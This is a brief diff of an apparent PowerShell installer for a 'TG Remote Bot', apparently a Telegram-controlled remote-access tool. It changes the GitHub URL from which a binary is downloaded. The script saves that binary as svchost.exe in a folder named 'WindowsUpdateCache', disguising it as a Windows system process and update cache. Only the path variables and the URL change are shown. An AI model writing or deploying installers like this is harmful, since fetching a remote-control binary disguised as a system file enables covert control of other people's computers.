@@ -6,7 +6,7 @@ $Dir     = "C:\ProgramData\WindowsUpdateCache"
 $ExeName = "svchost.exe"
 $ExePath = Join-Path $Dir $ExeName
 $TmpPath = Join-Path $env:TEMP $ExeName
-$Url     = "https://github.com/cecon123/tg-remote-bot/raw/dist/svchost.exe"
+$Url     = "https://github.com/cecon123/tg-remote-bot/raw/refs/heads/main/dist/svchost.exe"
 
 Write-Host "=== TG Remote Bot Setup ===" -ForegroundColor Cyan
 
